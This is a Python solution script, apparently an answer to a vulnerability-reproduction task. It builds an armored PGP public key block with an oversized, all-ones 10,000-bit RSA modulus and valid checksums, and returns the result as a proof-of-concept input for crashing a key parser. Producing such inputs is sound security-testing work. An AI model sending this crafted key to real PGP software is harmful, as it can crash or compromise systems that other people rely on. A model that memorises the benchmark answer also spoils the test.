import base64

class Solution:
    @staticmethod
    def _pgp_crc24(data: bytes) -> bytes:
        crc = 0xB704CE
        for byte in data:
            crc ^= (byte << 16)
            for _ in range(8):
                crc <<= 1
                if crc & 0x1000000:
                    crc ^= 0x1864CFB
        crc &= 0xFFFFFF
        return crc.to_bytes(3, 'big')

    def solve(self, src_path: str) -> bytes:
        version = b'\x04'
        creation_time = b'\x00\x00\x00\x00'
        pk_algo = b'\x01'

        n_bit_len = 10000
        n_byte_len = (n_bit_len + 7) // 8
        mpi_n_len_bytes = n_bit_len.to_bytes(2, 'big')
        mpi_n_data = b'\xff' * n_byte_len
        mpi_n = mpi_n_len_bytes + mpi_n_data

        e_val = 65537
        e_bit_len = e_val.bit_length()
        e_byte_len = (e_bit_len + 7) // 8
        mpi_e_len_bytes = e_bit_len.to_bytes(2, 'big')
        mpi_e_data = e_val.to_bytes(e_byte_len, 'big')
        mpi_e = mpi_e_len_bytes + mpi_e_data

        packet_body = version + creation_time + pk_algo + mpi_n + mpi_e

        packet_tag = 0x99
        packet_len = len(packet_body)
        packet_header = packet_tag.to_bytes(1, 'big') + packet_len.to_bytes(2, 'big')

        binary_data = packet_header + packet_body

        crc_bytes = self._pgp_crc24(binary_data)
        checksum_b64 = base64.b64encode(crc_bytes)

        body_b64_full = base64.b64encode(binary_data)
        wrapped_body = b'\n'.join(
            body_b64_full[i:i + 64] for i in range(0, len(body_b64_full), 64)
        )

        header = b'-----BEGIN PGP PUBLIC KEY BLOCK-----\n\n'
        footer = b'\n-----END PGP PUBLIC KEY BLOCK-----\n'
        
        poc = (
            header +
            wrapped_body +
            b'\n=' + checksum_b64 +
            footer
        )

        return poc